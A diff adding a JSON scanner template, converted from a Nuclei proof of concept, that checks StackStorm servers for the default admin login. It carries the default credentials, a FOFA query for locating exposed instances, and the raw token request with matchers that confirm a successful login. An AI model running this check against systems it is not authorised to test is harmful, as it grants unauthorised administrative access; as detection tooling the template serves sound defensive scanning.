@@ -1,0 +1,166 @@
+{
+  "id": "stackstorm-default-login",
+  "name": "StackStorm Default Login",
+  "author": "PaperPen",
+  "severity": "HIGH",
+  "description": "A StackStorm default admin login was discovered.",
+  "references": [
+    "https://github.com/StackStorm/st2-docker"
+  ],
+  "tags": [
+    "stackstorm",
+    "default-login"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"stackstorm\""
+  },
+  "variables": {
+    "password": [
+      "Ch@ngeMe"
+    ],
+    "username": [
+      "st2admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /auth/tokens HTTP/1.1\nHost: {{BaseURL}}\nContent-Type: application/json\nAuthorization: Basic {{base64(username + \u0027:\u0027 + password)}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "\"user\":",
+            "\"token\":",
+            "\"expiry\":"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "201"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "stackstorm-default-login",
+    "info": {
+      "name": "StackStorm Default Login",
+      "author": "PaperPen",
+      "severity": "high",
+      "description": "A StackStorm default admin login was discovered.",
+      "reference": [
+        "https://github.com/StackStorm/st2-docker"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"stackstorm\""
+      },
+      "tags": "stackstorm,default-login"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "st2admin"
+          ],
+          "password": [
+            "Ch@ngeMe"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /auth/tokens HTTP/1.1\nHost: {{BaseURL}}\nContent-Type: application/json\nAuthorization: Basic {{base64(username + \u0027:\u0027 + password)}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "\"user\":",
+              "\"token\":",
+              "\"expiry\":"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              201
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
